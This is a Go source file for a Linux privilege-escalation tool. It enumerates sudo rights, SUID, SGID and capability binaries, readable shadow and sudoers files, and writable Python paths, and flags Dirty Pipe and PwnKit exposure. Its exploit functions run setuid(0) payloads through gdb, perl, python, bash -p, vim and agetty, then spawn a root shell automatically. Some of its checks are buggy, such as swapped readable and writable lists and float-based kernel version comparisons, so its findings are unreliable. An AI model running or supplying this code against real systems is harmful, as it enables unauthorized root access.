package main
 
import (
    "fmt"
    "os"
    "syscall"
    "bufio"
    "strings"
    "os/exec"
    "bytes"
    "io/ioutil"
    "log"
    "errors"
    "strconv"
)
 
var (
     greenBg      = string([]byte{27, 91, 57, 55, 59, 52, 50, 109})
     whiteBg      = string([]byte{27, 91, 57, 48, 59, 52, 55, 109})
     yellowBg     = string([]byte{27, 91, 57, 48, 59, 52, 51, 109})
     redBg        = string([]byte{27, 91, 57, 55, 59, 52, 49, 109})
     blueBg       = string([]byte{27, 91, 57, 55, 59, 52, 52, 109})
     magentaBg    = string([]byte{27, 91, 57, 55, 59, 52, 53, 109})
     cyanBg       = string([]byte{27, 91, 57, 55, 59, 52, 54, 109})
     green        = string([]byte{27, 91, 51, 50, 109})
     white        = string([]byte{27, 91, 51, 55, 109})
     yellow       = string([]byte{27, 91, 51, 51, 109})
     red          = string([]byte{27, 91, 51, 49, 109})
     blue         = string([]byte{27, 91, 51, 52, 109})
     magenta      = string([]byte{27, 91, 51, 53, 109})
     cyan         = string([]byte{27, 91, 51, 54, 109})
     reset        = string([]byte{27, 91, 48, 109})
     disableColor = false
)

var (
    dangerous_groups = []string{"(sudo)", "(lxd)", "(docker)"}
    dangerous_sudo_perms = []string{"root", "NOPASSWD"}
    very_dangerous_sudo_perms = []string{"(ALL : ALL) ALL"}
    dangerous_capabilities = []string{"cap_setuid"}
    dangerous_bins = []string{
    "ab", "agetty", "alpine", "ar", "arj", "arp", "as", "ascii-xfr", "ash", "aspell", "atobm", "awk", "base32", "base64", "basenc", "bash", "bridge", "busybox", "bzip2", "capsh", "cat", "chmod", "choom", "chown", "chroot", "cmp", "column",
    "comm", "cp", "cpio", "cpulimit", "csh", "csplit", "csvtool", "cupsfilter", "curl", "cut", "dash", "date", "dd", "dialog", "diff", "dig", "dmsetup", "docker", "dosbox", "ed", "efax", "emacs", "env", "eqn", "expand", "expect", "file", 
    "find", "fish", "flock", "fmt", "fold", "gawk", "gcore", "gdb", "genie", "genisoimage", "gimp", "grep", "gtester", "gzip", "hd", "head", "hexdump", "highlight", "hping3", "iconv", "install", "ionice", "ip", "ispell", "jss", "join",
    "jq", "jrunscript", "ksh", "ksshell", "kubectl", "ld.so", "less", "logsave", "look", "lua", "make", "mawk", "more", "mosquitto", "msgattrib" , "msgcat", "msgconv", "msgfilter", "msgmerge", "msguniq", "multitime", "mv" , "nasm", "nawk", 
    "nice", "nl", "nm", "nmap", "node", "nohup", "od", "openssl", "openvpn", "paste", "perf", "perl", "pg", "php", "pidstat", "pr", "ptx", "python", "readelf", "restic", "rev", "rlwrap", "rsync", "run-parts", "rview", "rvim", "sash", "scanmem", 
    "sed", "setarch", "shuf", "soelim", "sort", "sqlite3", "ss", "ssh-keygen", "ssh-keyscan", "sshpass", "start-stop-daemon", "stdbuf", "strace", "strings", "sysctl", "systemctl", "tac", "tail", "taskset", "tbl", "tclsh", "tee", "tftp", "tic", 
    "time", "timeout", "troff", "ul", "unexpand", "uniq", "unshare", "unzip", "update-alternatives", "uudecode", "uuencode", "view", "vigr", "vim", "vimdiff", "vipw", "watch", "wc", "wget", "whiptail", "xargs", "xdotool", "xmodmap", "xmore",
    "xxd", "xz", "yash", "zsh", "zsoelim", "python3", "python3.8", "vim.basic",
    }
    vul_suid = []string{}
    vul_sgid = []string{}
    vul_cap = []string{}
    python_paths = []string{}
    dangerous_cap_bins = []string{"gdb", "node", "perl", "php", "python", "ruby", "rview", "rvim", "view", "vim", "vimdiff"}

)

var (
    kernal float64 = 0
)

func colorize(colorized_string string) string {
    block_chars := []string{"╔", "═", "║", "╚", "╠"}
    for _, char := range block_chars {
        if strings.Contains(colorized_string, char) {
            colorized_string = fmt.Sprintf(strings.Replace(colorized_string, char, fmt.Sprint(cyan, char, reset), -1))
        }
    }
    return colorized_string
}

func is_readable(fileName string) bool {
    file, err := os.Open(fileName)
    if err != nil {
        return false
    }
    defer file.Close()
    return true
}

func is_writable(fileName string) bool {
    err := syscall.Access(fileName, syscall.O_RDWR)
    if err != nil {
        return false
    }
    return true
}

func is_symlink(fileName string) bool {
    fi, _ := os.Lstat(fileName)
    if fi.Mode() & os.ModeSymlink == os.ModeSymlink {
        return true
    }
    return false
}

func exists(fileName string) bool {
    _, err := os.Stat(fileName)
    if errors.Is(err, os.ErrNotExist) {
        return false
    }
    return true
}

func longer_cmd(command string) string {
    tmpfile := "/tmp/testingfile"
    file, _ := os.Create(tmpfile)
    os.Chmod(tmpfile, 0777)
    _, _ = file.Write([]byte(fmt.Sprintf(command)))
    defer file.Close()

    whoami := exec.Command("/bin/bash", tmpfile)
    whoami_out := &bytes.Buffer{}
    whoami.Stdout = whoami_out
    whoami.Run()
    os.Remove(tmpfile)
    return fmt.Sprintf("%s", whoami_out)
}

func spawn_shell(command string) {
    tmpfile := "/tmp/testingfile"
    file, _ := os.Create(tmpfile)
    os.Chmod(tmpfile, 0777)
    _, _ = file.Write([]byte(fmt.Sprintf(command)))
    defer file.Close()

    args := []string{"/bin/bash", tmpfile}
    env := os.Environ()
    execErr := syscall.Exec("/bin/bash", args ,env)
    if execErr != nil {
        panic(execErr)
    }

}

func slice_contains(slice []string, keyword string) bool {
    for _, test := range slice {
        if strings.Contains(test, keyword) {
            return true
            break
        }
    }
    return false
}

func basic_info() {
  id := exec.Command("id")
  id_out := &bytes.Buffer{}
  id.Stdout = id_out
  id.Run()
  fmt.Println(colorize("╔═════ id"))
  fmt.Println(colorize("║"))
  test := fmt.Sprintf("%s", id_out)
  for _, group := range dangerous_groups {
    test = fmt.Sprintf(strings.Replace(test, group, fmt.Sprint(redBg, group, reset), -1))
  }
  fmt.Println(colorize("╚══ "),test)

  hostname := exec.Command("hostname")
  hostname_out := &bytes.Buffer{}
  hostname.Stdout = hostname_out
  hostname.Run()
  fmt.Println(colorize("╔═════ hostname"))
  fmt.Println(colorize("║"))
  fmt.Println(colorize("╚══ "), hostname_out)
}

func net_info() {
  ss := exec.Command("ss",  "-a",  "-p" ,"-t", "-u", "state", "established", "state", "listening")
  ss_out := &bytes.Buffer{}
  ss.Stdout = ss_out
  ss.Run()
  fmt.Println(colorize("╔═════ basic net info (ss)"))
  fmt.Println(colorize("║"))
  test := strings.Split(fmt.Sprintf("%s", ss_out), "\n")
  for _, itr := range test {
    if itr == "" {
        continue
    }
    fmt.Println(colorize("╠══"), itr)
  }
}

func release() {
  uname_a := exec.Command("/usr/bin/uname", "-a")
  uname_a_out := &bytes.Buffer{}
  uname_a.Stdout = uname_a_out
  uname_a.Run()
  fmt.Println(colorize("╔═════ release"))
  fmt.Println(colorize("║"))
  fmt.Print(colorize("╠══ "), uname_a_out)
  fmt.Println(colorize("║"))

  lsb_release_a := exec.Command("lsb_release", "-a")
  lsb_release_a_out := &bytes.Buffer{}
  lsb_release_a.Stdout = lsb_release_a_out
  lsb_release_a.Run()
  test := strings.Split(fmt.Sprintf("%s", lsb_release_a_out), "\n")

  for _, list := range test {
    if list == "" {
        continue
    }
    fmt.Println(colorize("╠══ "), list)
  }

  uname_r:= exec.Command("uname", "-r")
  uname_r_out := &bytes.Buffer{}
  uname_r.Stdout = uname_r_out
  uname_r.Run()

  no_dash := strings.Split(fmt.Sprintf("%s", uname_r_out), "-")
  release := (no_dash[0])
  no_period := strings.Split(release, ".")
  processed_release := (no_period[0] + "." + no_period[1])

  fmt.Println(colorize("╠══  Kernal version: "), processed_release)
  kernal, _  = strconv.ParseFloat(processed_release, 8) 
}

func sudo_l() {
  sudo_l := exec.Command("sudo", "-l")
  sudo_l_out := &bytes.Buffer{}
  sudo_l.Stdout = sudo_l_out
  sudo_l.Run()
  fmt.Println(colorize("╔═════ sudo permsissions"))
  fmt.Println(colorize("║"))

  test2 := fmt.Sprintf("%s", sudo_l_out)

  for _, perm := range dangerous_sudo_perms {
    test2 = strings.Replace(test2, perm, fmt.Sprint(red, perm, reset), -1)
  }
  for _, perm := range very_dangerous_sudo_perms {
    test2 = strings.Replace(test2, perm, fmt.Sprint(redBg, perm, reset), -1)
  }
  for _, bin := range dangerous_bins {
    test2 = strings.Replace(test2, fmt.Sprintf(bin+"\n"), fmt.Sprint(redBg, fmt.Sprintf(bin), reset , "\n"), -1)
  }

  test3 := strings.Split(test2, "\n")
  for _, line := range test3 {
    fmt.Println(colorize("╠══ "), line)
  }
}


func suid() {
  find_suid := exec.Command("/usr/bin/find", "/", "-perm", "/4000")
  find_suid_out := &bytes.Buffer{}
  find_suid.Stdout = find_suid_out
  find_suid.Run()
  fmt.Println(colorize("╔═════ Suid"))
  fmt.Println(colorize("║"))
  suid_list := strings.Split(fmt.Sprintf("%s", find_suid_out), "\n")

  printed := false
  for _, suid := range suid_list {
    test2 := strings.Split(suid, "/")
    test3 := fmt.Sprintf(test2[len(test2)-1])

    for _, bin := range dangerous_bins {
        if test3 == bin {
            vul_suid = append(vul_suid, suid)
            fmt.Println(colorize("╠══"),redBg, suid, reset)
            printed = true
        } 
    } //end of second for loop

    if printed != true {
        fmt.Println(colorize("╠══"),suid)
    } 
    printed = false
  } // end of first for loop
}

func sgid() {
  find_sgid := exec.Command("/usr/bin/find", "/", "-perm", "/6000")
  find_sgid_out := &bytes.Buffer{}
  find_sgid.Stdout = find_sgid_out
  find_sgid.Run()
  fmt.Println(colorize("╔═════ sgid"))
  fmt.Println(colorize("║"))
  sgid_list := strings.Split(fmt.Sprintf("%s", find_sgid_out), "\n")

  printed := false
  for _, guid := range sgid_list {
    test2 := strings.Split(guid, "/")
    test3 := fmt.Sprintf(test2[len(test2)-1])

    for _, bin := range dangerous_bins {
        if test3 == bin {
            vul_sgid = append(vul_sgid, guid)
            fmt.Println(colorize("╠══"),redBg, guid, reset)
            printed = true
        } 
    } //end of second for loop

    if printed != true {
        fmt.Println(colorize("╠══"),guid)
    } 
    printed = false
  } // end of first for loop
}

func users() {
    file, _ := os.Open("/etc/passwd")
    defer file.Close()
    fmt.Println(colorize("╔═════ users"))
    fmt.Println(colorize("║"))
    scanner := bufio.NewScanner(file)

    for scanner.Scan() {
        bash := strings.Contains(scanner.Text(), "bash")
        dash := strings.Contains(scanner.Text(), "dash")
        sh := strings.Contains(scanner.Text(), "sh")
        if bash || dash || sh {
          fmt.Println(colorize("╠══"), scanner.Text())
        }
    }
    fmt.Println()
    if err := scanner.Err(); err != nil {
        fmt.Println(err)
    }
}


func capabilites() {
  getcap := exec.Command("getcap", "-r", "/")
  getcap_out := &bytes.Buffer{}
  getcap.Stdout = getcap_out
  getcap.Run()
  fmt.Println(colorize("╔═════ capabilites"))
  fmt.Println(colorize("║"))
  test := strings.Split(fmt.Sprintf("%s", getcap_out), "\n")

  vulnurable := false
  for _, cap := range test {
    if cap == "" {
        continue
    }    
    for _, bin := range dangerous_cap_bins {
        if strings.Contains(cap, bin) && strings.Contains(cap, "cap_setuid+ep") {
            cap = strings.Replace(cap, cap, fmt.Sprint(redBg, cap, reset), -1)
            vul_cap = append(vul_cap, cap)
            fmt.Println(colorize("╠══"), cap)
            vulnurable = true
        } 
    }
    if vulnurable == true {
        vulnurable = false
        continue
    }
    for _, perm := range dangerous_capabilities {
        if strings.Contains(cap, perm) {
                    cap = strings.Replace(cap, perm, fmt.Sprint(red, perm, reset), -1)
            }
    }


    fmt.Println(colorize("╠══"), cap)
  }
}

func weakpermissions() {
    checkread := []string{"/etc/shadow", "/etc/sudoers", "/root"}
    checkwrite := []string{"/etc/passwd", "/etc/shadow", "/etc/sudoers", "/root"}
    readable := []string{}
    writable := []string{}

    for _, dir := range checkwrite {
        test_w := is_writable(dir)
        if test_w == true {
            readable = append(readable, dir)
        }
    }
    for _, dir := range checkread {
        test_r := is_readable(dir)
        if test_r == true {
            writable = append(writable, dir)
        }
    }
    if len(readable) != 0 {
      fmt.Println(colorize("╔═════ Readable files and directorys"))
      fmt.Println(colorize("║"))
      fmt.Println(colorize("╚══ "), readable)
      fmt.Println()
    }
    if len(writable) != 0 {
      fmt.Println(colorize("╔═════ writable files and directorys"))
      fmt.Println(colorize("║"))
      fmt.Println(colorize("╚══ "), writable)
      fmt.Println()
    }
}


func useful_software(){
    files, err := ioutil.ReadDir("/usr/bin")
    if err != nil {
        log.Fatal(err)
    }
    fmt.Println(colorize("╔═════ useful software"))
    fmt.Println(colorize("║"))

    for _, file := range files {
        if strings.Contains(file.Name(), "python") {
            if strings.Contains(file.Name(), "config") {
                continue
            }

            fmt.Print(colorize("╠══ /usr/bin/"), file.Name(), "\n")
            python_path := fmt.Sprintf("%s", "/usr/bin/" + file.Name())
            python_paths = append(python_paths, python_path)

            } else if file.Name() == "go" {
                fmt.Print(colorize("╠══ /usr/bin/"), file.Name(), "\n")
            } else if file.Name() == "gcc" {
                fmt.Print(colorize("╠══ /usr/bin/"), file.Name(), "\n")
            } else if file.Name() == "base64" {
                fmt.Print(colorize("╠══ /usr/bin/"), file.Name(), "\n")
            } else if file.Name() == "nc" {
                fmt.Print(colorize("╠══ /usr/bin/"), file.Name(), "\n")
            } else {
                continue
            }
    }
}

func py_path_hijack() {

    if len(python_paths) != 0 {
        fmt.Println(colorize("╔═════ checking python path (library hijacking vulnerabilities)"))
        fmt.Println(colorize("║"))
        real_python_paths := []string{}

        for _, dir := range python_paths {
            test := is_symlink(dir)
            if test == false {
                real_python_paths = append(real_python_paths, dir)
            } //second if
        } // for loop

        for _, dir := range real_python_paths{
            id_out := longer_cmd(fmt.Sprintf(dir + ` -c 'import sys;print("\n".join(sys.path))'`))
            
            id_out2 := fmt.Sprintf(id_out)
            id_out3 := strings.Split(id_out2, "\n")

            for _, dir := range id_out3 {
                if dir == "" {
                    continue
                }
                if exists(dir) != true {
                    fmt.Println(colorize("╠══ "), dir, "-- does not exist")
                    continue
                }
                if is_writable(dir) == true {
                    fmt.Println(colorize("╠══ "), dir, "-- writable")
                } else {
                    fmt.Println(colorize("╠══ "), dir)
                }

                files, err := ioutil.ReadDir(dir)
                if err != nil {
                    log.Fatal(err)
                }

                for _, file := range files {
                    path := fmt.Sprintf(dir + "/" + file.Name())

                    if is_writable(path) {
                        fmt.Println(colorize("║      ╚══ "), path, "-- writable")
                    }
                }
            }
        }
    } // first if
} // func end


func linux_exploits() {
    //dirty pipe
    if kernal >= 5.8 && kernal <= 5.17 {
        fmt.Println(colorize("      ╚══ "), redBg, "Vulnerable to CVE-2022-0847", reset, red, "(dirty pipe)", reset)
    }

    //pwnkit
    test := longer_cmd(fmt.Sprintf("%s", `stat -c '%%Y' $(which pkexec)`))
    test = strings.Replace(test, "\n", "", -1)
    test2, _ := strconv.Atoi(test)
    if test2 < 1642035600 {
        fmt.Println(colorize("      ╚══ "), redBg, "Vulnerable to CVE-2021-4034", reset, red, "(pwnkit)", reset)
    }
}


func exploit_cap() {
    if slice_contains(vul_cap, "gdb") {
        gdb_cap_test := longer_cmd(fmt.Sprintf(`gdb -q -nx -ex 'python import os; os.setuid(0)' -ex '!whoami' -ex quit`))
        if gdb_cap_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`gdb -q -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/bash' -ex quit`))
        } else if gdb_cap_test != "root\n" {
           fmt.Println("gdb capabilities exploit failed. ")
        }
    }

    if slice_contains(vul_cap, "node") {
        fmt.Println("vulnurable but currently no exploit")
    }

    if slice_contains(vul_cap, "perl") {
        perl_cap_test := longer_cmd(fmt.Sprintf(`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'`))
        if perl_cap_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'`))
        } else if perl_cap_test != "root\n" {
           fmt.Println("perl capabilities exploit failed. ")
        }
    }

    if slice_contains(vul_cap, "php") {
        fmt.Println("vulnurable but currently no exploit")
    }

    if slice_contains(vul_cap, "python") {
        python_cap_test := longer_cmd(fmt.Sprintf(`python -c 'import os; os.setuid(0); os.system("whoami")'`))
        if python_cap_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`python -c 'import os; os.setuid(0); os.system("/bin/bash")'`))
        } else if python_cap_test != "root\n" {
           fmt.Println("python capabilities exploit failed. ")
        }
    }

    if slice_contains(vul_cap, "ruby") {
        fmt.Println("vulnurable but currently no exploit")
    }

    if slice_contains(vul_cap, "rview") {
        fmt.Println("vulnurable but currently no exploit")
    }

    if slice_contains(vul_cap, "rvim") {
        fmt.Println("vulnurable but currently no exploit")
    }

    if slice_contains(vul_cap, "view") {
        fmt.Println("vulnurable but currently no exploit")
    }

    if slice_contains(vul_cap, "vim") {
        fmt.Println("vulnurable but currently no exploit")
    }
    
    if slice_contains(vul_cap, "vimdiff") {
        fmt.Println("vulnurable but currently no exploit")
    }
}

func exploit_sgid() {
    if slice_contains(vul_sgid, "python") {
        python_suid_test := longer_cmd(fmt.Sprintf(`sudo python -c 'import os; os.system("whoami")'`))
        if python_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo python -c 'import os; os.execl("/bin/bash", "bash", "-p")'`))
        }  else if python_suid_test != "root\n" {
            fmt.Println("python suid exploit failed")
        }
    }

    if slice_contains(vul_sgid, "agetty") {
        fmt.Println("agetty exploit: enter 'fg || fg' in event of backgrounding")
        spawn_shell(fmt.Sprintf(`sudo agetty -o -p -l /bin/bash -a root tty`))
    }

    if slice_contains(vul_sgid, "bash") {
        bash_suid_test := longer_cmd(fmt.Sprintf(`sudo /bin/bash -c "whoami"`))
        if bash_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`bash -p`))
        } else if bash_suid_test != "root\n" {
            fmt.Println("bash suid exploit failed")
        }
    }

    if slice_contains(vul_sgid, "vim") {
        vim_suid_test := longer_cmd(fmt.Sprintf(`sudo vim -c ':!whoami'`))
        if strings.Contains(vim_suid_test,"root\n" ) {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo vim -c ':!/bin/bash'`))
        } else if vim_suid_test != "root\n" {
            fmt.Println("bash suid exploit failed")
        }
    }

}

func exploit_suid() {
    if slice_contains(vul_suid, "python") {
        python_suid_test := longer_cmd(fmt.Sprintf(`sudo python -c 'import os; os.system("whoami")'`))
        if python_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo python -c 'import os; os.execl("/bin/bash", "bash", "-p")'`))
        }  else if python_suid_test != "root\n" {
            fmt.Println("python suid exploit failed")
        }
    }

    if slice_contains(vul_suid, "agetty") {
        fmt.Println("agetty exploit: enter 'fg || fg' in event of backgrounding")
        spawn_shell(fmt.Sprintf(`sudo agetty -o -p -l /bin/bash -a root tty`))
    }

    if slice_contains(vul_suid, "bash") {
        bash_suid_test := longer_cmd(fmt.Sprintf(`sudo /bin/bash -c "whoami"`))
        if bash_suid_test == "root\n" {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`bash -p`))
        } else if bash_suid_test != "root\n" {
            fmt.Println("bash suid exploit failed")
        }
    }

    if slice_contains(vul_suid, "vim") {
        vim_suid_test := longer_cmd(fmt.Sprintf(`sudo vim -c ':!whoami'`))
        if strings.Contains(vim_suid_test,"root\n" ) {
            fmt.Println("am root")
            spawn_shell(fmt.Sprintf(`sudo vim -c ':!/bin/bash'`))
        } else if vim_suid_test != "root\n" {
            fmt.Println("bash suid exploit failed")
        }
    }

}

func main() {
  basic_info()
  release()
  linux_exploits()
  fmt.Println()
  sudo_l()
  fmt.Println()
  users()
  net_info()
  fmt.Println()
  weakpermissions()
  useful_software()
  fmt.Println()
  py_path_hijack()
  fmt.Println()
  suid()
  fmt.Println()
  sgid()
  fmt.Println()
  capabilites()
  fmt.Println()
  exploit_cap()
  exploit_sgid()
  exploit_suid()
}